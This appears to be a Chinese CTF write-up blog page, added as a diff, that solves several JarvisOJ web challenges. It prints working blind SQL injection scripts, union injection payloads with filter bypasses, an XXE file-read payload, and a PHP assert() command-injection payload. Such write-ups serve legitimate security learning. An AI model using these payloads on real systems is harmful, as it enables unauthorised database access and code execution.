@@ -1,0 +1,1057 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Bling_Dog">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Bling_Dog">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>jarvisoj web部分wp · Bling_dog&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Bling_dog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">jarvisoj web部分wp</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Bling_dog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            jarvisoj web部分wp
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/10/26</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Port-51"><a href="#Port-51" class="headerlink" title="Port 51"></a>Port 51</h1><p>直接在vps上访问即可<br><img src="https://upload-images.jianshu.io/upload_images/11234137-488c13340cc38e06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-488c13340cc38e06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="Simple-injection"><a href="#Simple-injection" class="headerlink" title="Simple injection"></a>Simple injection</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">temp=&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;</span><br><span class="line">url=&apos;http://web.jarvisoj.com:32787/login.php&apos;</span><br><span class="line">s=requests.session()</span><br><span class="line">user=&quot;admin&apos;and/**/substr(database(),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;#&quot;</span><br><span class="line">user1=&quot;admin&apos;and/**/substr(select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=&apos;&apos;,&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;#&quot;</span><br><span class="line">password=&apos;1&apos;</span><br><span class="line">datadase=&apos;&apos;</span><br><span class="line">for j in range(1,20):</span><br><span class="line">    for i in temp:</span><br><span class="line">        username=user.format(j,i)</span><br><span class="line">        payload=&#123;</span><br><span class="line">            &apos;username&apos;:username,</span><br><span class="line">            &apos;password&apos;:password</span><br><span class="line">        &#125;</span><br><span class="line">        # print payload</span><br><span class="line">        r=s.post(url,data=payload)</span><br><span class="line">        ppp=r.content</span><br><span class="line">        if &apos;密码错误&apos; in ppp:</span><br><span class="line">            datadase=datadase+i</span><br><span class="line">            print datadase</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">temp=&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,&apos;</span><br><span class="line">url=&apos;http://web.jarvisoj.com:32787/login.php&apos;</span><br><span class="line">s=requests.session()</span><br><span class="line">user1=&quot;admin&apos;and/**/substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;#&quot;</span><br><span class="line">password=&apos;1&apos;</span><br><span class="line">a=&apos;iInNjJeEcCtTiIoOnN&apos;</span><br><span class="line">datadase=&apos;&apos;</span><br><span class="line">for j in range(1,20):</span><br><span class="line">    for i in temp:</span><br><span class="line">        username=user1.format(j,i)</span><br><span class="line">        payload=&#123;</span><br><span class="line">            &apos;username&apos;:username,</span><br><span class="line">            &apos;password&apos;:password</span><br><span class="line">        &#125;</span><br><span class="line">        # print payload</span><br><span class="line">        r=s.post(url,data=payload)</span><br><span class="line">        ppp=r.content</span><br><span class="line">        if &apos;密码错误&apos; in ppp:</span><br><span class="line">            datadase=datadase+i</span><br><span class="line">            print datadase</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">temp=&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,&apos;</span><br><span class="line">url=&apos;http://web.jarvisoj.com:32787/login.php&apos;</span><br><span class="line">s=requests.session()</span><br><span class="line">user=&quot;admin&apos;and/**/substr((select/**/database()),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;#&quot;</span><br><span class="line">user1=&quot;admin&apos;and/**/substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;#&quot;</span><br><span class="line">user2=&quot;admin&apos;and/**/(substring((select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;admin&apos;)),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)#&quot;</span><br><span class="line">password=&apos;1&apos;</span><br><span class="line">a=&apos;iInNjJeEcCtTiIoOnN&apos;</span><br><span class="line">data=&apos;&apos;</span><br><span class="line">for j in range(1,50):</span><br><span class="line">    for i in temp:</span><br><span class="line">        username=user2.format(j,i)</span><br><span class="line">        payload=&#123;</span><br><span class="line">            &apos;username&apos;:username,</span><br><span class="line">            &apos;password&apos;:password</span><br><span class="line">        &#125;</span><br><span class="line">        # print payload</span><br><span class="line">        r=s.post(url,data=payload)</span><br><span class="line">        ppp=r.content</span><br><span class="line">        if &apos;密码错误&apos; in ppp:</span><br><span class="line">            data=data+i</span><br><span class="line">            print data</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line">temp=&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,&apos;</span><br><span class="line">url=&apos;http://web.jarvisoj.com:32787/login.php&apos;</span><br><span class="line">s=requests.session()</span><br><span class="line">user=&quot;admin&apos;and/**/substr((select/**/database()),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;#&quot;</span><br><span class="line">user1=&quot;admin&apos;and/**/substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;#&quot;</span><br><span class="line">user2=&quot;admin&apos;and/**/(substring((select(password)from(admin)),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)#&quot;</span><br><span class="line">password=&apos;1&apos;</span><br><span class="line">a=&apos;iInNjJeEcCtTiIoOnN&apos;</span><br><span class="line">data=&apos;&apos;</span><br><span class="line">for j in range(1,50):</span><br><span class="line">    for i in temp:</span><br><span class="line">        username=user2.format(j,i)</span><br><span class="line">        payload=&#123;</span><br><span class="line">            &apos;username&apos;:username,</span><br><span class="line">            &apos;password&apos;:password</span><br><span class="line">        &#125;</span><br><span class="line">        # print payload</span><br><span class="line">        r=s.post(url,data=payload)</span><br><span class="line">        ppp=r.content</span><br><span class="line">        if &apos;密码错误&apos; in ppp:</span><br><span class="line">            data=data+i</span><br><span class="line">            print data</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+<p>最后的得到password的md5：334cfb59c9d74849801d5acdcfdaadc3<br>解密之后得到密码：eTAloCrEP<br>这里分享一个<a href="http://cn.freemd5.com/index.php" target="_blank" rel="noopener">比较好用的md5解密网站</a></p>
+<h1 id="EASY-gallery"><a href="#EASY-gallery" class="headerlink" title="EASY gallery"></a>EASY gallery</h1><p>接触的文件上传的题目比较少，用了%00截断发现没作用，而且只允许穿jpg和png，查了wp之后才发现是图片马，他木马放到图片的内容里面，然后%00截断访问。</p>
+<h1 id="IN-A-MESS"><a href="#IN-A-MESS" class="headerlink" title="IN A MESS"></a>IN A MESS</h1><p>刚开始要获取路径，获取路径之后注入。<br>爆表:id=-1/<em>1</em>/uniunionon/<em>1</em>/seselectlect/<em>1</em>/1,2,group_concat(table_name)/<em>1</em>/frfromom/<em>1</em>/information_schema.tables/<em>1</em>/where/<em>1</em>/table_schema=database()#<br>爆列:id=-1/<em>1</em>/uniunionon/<em>1</em>selectlect/<em>1</em>/1,2,group_concat(column_name)/<em>1</em>/frfromom/<em>1</em>/information_schema.columns/<em>1</em>/where/<em>1</em>/table_name=0x636f6e74656e74#<br>爆内容:^EHT2mCpcvOLf/index.php?id=-1/<em>1</em>/uniunionon/<em>1</em>/seselectlect/<em>1</em>/1,2,group_concat(context)/<em>1</em>/frfromom/<em>1</em>/content#</p>
+<h1 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h1><p>这个题涉及到XXE的知识，之前做题没有深入了解过，这里查看了大佬的wp才了解一些。决定近期好好学一下XXE的知识。<br>抓包，改包。将content-type格式改为application/xml，然后post数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:////home/ctf/flag.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
+<p>成功得到flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-20dd71f28f29bd5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-20dd71f28f29bd5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h1><p>题目提示要先找源码，首先御剑扫描一波，发现index.php~<br><img src="https://upload-images.jianshu.io/upload_images/11234137-b9bcd62159cf1d6d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-b9bcd62159cf1d6d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>得到源码如下，之后闭合反单引号进行注入即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&quot;config.php&quot;);</span><br><span class="line">$table = $_GET[&apos;table&apos;]?$_GET[&apos;table&apos;]:&quot;test&quot;;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,&quot;desc `secret_&#123;$table&#125;`&quot;) or Hacker();</span><br><span class="line">$sql = &quot;select &apos;flag&#123;xxx&#125;&apos; from secret_&#123;$table&#125;&quot;;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line">echo $ret[0];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>最终payload:<a href="http://web.jarvisoj.com:32794/index.php?table=test`%20`union%20select%20group_concat(flagUwillNeverKnow)%20from%20secret_flag%20limit%201,1--+" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php?table=test`%20`union%20select%20group_concat(flagUwillNeverKnow)%20from%20secret_flag%20limit%201,1--+</a><br><img src="https://upload-images.jianshu.io/upload_images/11234137-39f63e11083ae742.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-39f63e11083ae742.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h1><p>根据页面提示，GitHack下来源码。然后利用发现index<br><img src="https://upload-images.jianshu.io/upload_images/11234137-5b0ee6f81711aa08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-5b0ee6f81711aa08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后利用发现index.php中有assert函数，assert函数可以执行php代码从而getshell。<br>代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&apos;page&apos;])) &#123;</span><br><span class="line">	$page = $_GET[&apos;page&apos;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page = &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</span><br><span class="line">assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line">assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>最终padload:web.jarvisoj.com:32798/?page=flag%27.system(“cat%20templates/flag.php”).%27<br><img src="https://upload-images.jianshu.io/upload_images/11234137-03a481cba738889d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-03a481cba738889d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">Bling_Dog</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2018/10/26/jarvisoj/">http://yoursite.com/2018/10/26/jarvisoj/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2018/10/26/jarvisoj/">October 26th 2018, 3:30:26 pm</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2018/10/26/jarvisoj/">November 8th 2018, 9:21:02 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2018/10/27/安恒11月/" title="安恒杯11月份密码学部分wp">
+                    <div class="nextTitle">安恒杯11月份密码学部分wp</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2018/10/24/phpxuliehua/" title="PHP反序列化的一些例子">
+                    <div class="prevTitle">PHP反序列化的一些例子</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:563667866@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fi3ework" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
